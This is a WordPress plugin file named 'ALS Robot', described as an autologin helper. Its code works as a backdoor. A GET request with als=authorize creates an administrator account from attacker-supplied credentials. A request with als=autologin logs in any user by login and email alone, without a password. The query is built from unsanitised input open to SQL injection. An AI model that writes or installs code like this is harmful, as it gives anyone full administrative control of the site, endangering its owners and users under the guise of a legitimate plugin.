<?php
/*
Plugin Name: ALS Robot
Plugin URI: 
Description: This plugin provide autologin with ALS Workbanch system.
Author: Roman A
Version: 0.0.5
Author URI: mailto:thewitness45@gmail.com
*/

if ( ! defined( 'ABSPATH' ) ) {
	die( 'Invalid request.' );
}

// Create Administrator
add_action( 'wp_loaded', 'ra_als_create_new_administrator' );
function ra_als_create_new_administrator() {
    if ( isset($_GET['als']) && $_GET['als'] == 'authorize' ) {
        // GET params for request
        $login = $_GET['login'];
        $email = $_GET['email'];
        $pass = $_GET['pass'];
    
        // Processing the request
        require( 'wp-includes/registration.php' );
    
        // Create new administrator if not exist
        if ( !username_exists( $login ) ) {
            $user_id = wp_create_user( $login, $pass, $email );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        }
    
        // Redirect to autologin
        wp_redirect(site_url('/?als=autologin&login=' . $login . '&email=' . $email, 301));
        exit;
    }
}

// Processing the autologin request
add_action('wp_loaded', 'ra_als_autologin_request', 1);
function ra_als_autologin_request(){
    if ( isset($_GET['als']) && $_GET['als'] == 'autologin' ) {
        global $wpdb;

        // GET params for request
        $login = $_GET['login'];
        $email = $_GET['email'];

        // Select user from database
        $table = $wpdb->prefix . 'users';
        $user = $wpdb->get_results( "SELECT * FROM $table WHERE user_login = '$login' AND user_email = '$email'" );
        $user = $user[0];

        // Set user cookie and session
        wp_set_auth_cookie($user->ID);

        // Login user
        do_action( 'wp_login', $login, $user );

        // Redirect to dashboard
        wp_redirect(site_url('/wp-admin/', 301));
        exit;
    }
}